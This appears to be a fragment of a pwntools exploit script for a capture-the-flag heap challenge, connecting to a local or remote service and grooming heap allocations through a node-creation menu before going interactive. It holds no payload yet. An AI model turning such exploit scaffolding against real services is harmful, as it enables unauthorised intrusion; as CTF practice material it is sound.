from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
def new_node(position, dat):
  s.recvuntil('quit')
  s.sendline('0')
  s.recvuntil('?')
  s.sendline(position)
  s.recvuntil('data len?')
  s.sendline(str(len(dat)))
  s.send(dat)
def gc():
  s.recvuntil('quit')
  s.sendline('3')
new_node("0", "A"*0x200)
new_node("1", "B"*0x200)
new_node("0 1", "C"*0x100)
s.interactive()
